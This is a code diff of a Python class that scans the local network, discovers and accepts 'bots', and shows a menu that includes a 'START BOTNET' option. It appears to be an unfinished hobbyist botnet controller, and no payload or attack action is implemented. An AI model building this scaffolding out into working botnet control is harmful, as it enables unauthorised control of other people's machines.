@@ -2,7 +2,7 @@ import platform
 import subprocess
 import re
 import socket
-import keyboard
+# import keyboard
 import threading
 
 
@@ -19,26 +19,14 @@ class Network:
     def FindDevices(self):
         if self.OS == "Windows":
             addr = subprocess.check_output("arp -a", shell=True, encoding="cp1251")
+            # MyAddr = subprocess.check_output("ipconfig", shell=True, encoding="cp1251")
             ip_regex = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
             addr = re.findall(ip_regex, addr)
+            # MyAddr = re.findall(ip_regex, MyAddr)
+            # print(MyAddr)
+            # addr = [i for i in addr if i not in MyAddr]
             self.addr = addr
             print(self.addr)
-
-    def Server(self):
-        for i in self.addr:
-            HOST = (i, int(self.port))
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.bind(HOST)
-            s.listen(5)
-            count = 0
-            while True:
-                data, address = s.accept()
-                if address not in self.bots:
-                    self.bots.append(address)  # Если такого клиента нету , то добавить
-                if keyboard.is_pressed("s") and count % 1000 == 0:
-                    break
-                count += 1
 
     # перед работой сделать udp запросы по адресам, которые есть в self.addr
     def FindBots(self):
@@ -63,11 +51,36 @@ class Network:
                 print("Таймаут - больше нет сообщений")
                 break
 
+    def Info(self):
+        return "#########Choice#########\n" \
+               "#(1)   CHECK IN LAN (1)#\n" \
+               "#(2)Find BOTS IN LAN(2)#\n" \
+               "#(3)  START BOTNET  (3)#\n" \
+               "#(p)   Print Bots   (p)#\n" \
+               "#(e)     EXIT       (e)#\n" \
+               "#########Choice#########\n"
+
     def StartServer(self):
-        validate_threading = threading.Thread(target=self.FindBots)
-        accept_threading = threading.Thread(target=self.GetAcceptBot)
-        accept_threading.start()
-        validate_threading.start()
+        while True:
+            print(self.Info())
+            x = str(input())
+            match x:
+                case "1":
+                    self.FindDevices()
+                case "2":
+                    validate_threading = threading.Thread(target=self.FindBots)
+                    accept_threading = threading.Thread(target=self.GetAcceptBot)
+                    accept_threading.start()
+                    validate_threading.start()
+                case "3":
+                    print(1)
+                case "p":
+                    print("Bots in botnet:")
+                    print(self.bots)
+                case "e":
+                    exit(4)
+                case _:
+                    print("Command not found!")
 
     def Client(self):
         print(self.ip, self.port)
@@ -96,3 +109,6 @@ class Network:
                 print("Таймаут - больше нет сообщений")
                 break
         print(2)
+
+# Будущие фиксы
+# сервер отправляет сам себе запросы!
